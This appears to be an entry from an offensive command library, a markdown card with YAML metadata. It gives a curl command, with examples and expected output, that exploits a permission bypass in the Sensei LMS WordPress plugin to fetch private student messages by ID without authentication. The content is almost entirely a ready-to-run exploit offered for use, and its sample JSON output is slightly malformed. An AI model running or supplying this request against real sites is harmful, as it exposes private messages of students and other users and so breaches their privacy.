---
data: >-
  curl -X GET "https://target.com/wp-json/wp/v2/sensei-messages/<ID>" -H
  "Accept: application/json"
tags:
  - rest-api
  - information-disclosure
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:29.187Z'
id: 57fa81b0-bc14-40a5-87fb-2f56417a05e3
verified: false
validated: true
submitted: true
---
# curl-retrieve-sensei-message

## Command

```bash
curl -X GET "https://target.com/wp-json/wp/v2/sensei-messages/<ID>" -H "Accept: application/json"
```

## Description

This command performs an unauthenticated GET request to the Sensei LMS REST API endpoint to retrieve a private message by its numeric ID, exploiting the permission bypass vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<ID>` | Numeric ID of the sensei-message (e.g., 123) | Yes |
| `-X GET` | Specifies the HTTP method | Yes |
| `-H "Accept: application/json"` | Requests JSON response format | No (default often JSON) |

## Examples

### Basic Usage

```bash
curl -X GET "https://example.com/wp-json/wp/v2/sensei-messages/1"
```

### Advanced Usage

```bash
curl -X GET "https://example.com/wp-json/wp/v2/sensei-messages/1" -H "Accept: application/json" -v
```

(Adds verbose output for debugging headers and status.)

## Expected Output

Successful execution returns a JSON object with message details:

```json
{
  "id": 1,
  "date": "2023-01-01T00:00:00",
  "title": {
    "rendered": "Private Student Question"
  },
  "content": {
    "rendered": "<p>Question content here...</p>
  },
  "status": "private"
}
```

Error (e.g., invalid ID) returns 404 or empty array.

## Related

- [[Related Procedure: Access-Private-Sensei-Messages-via-REST-API]]
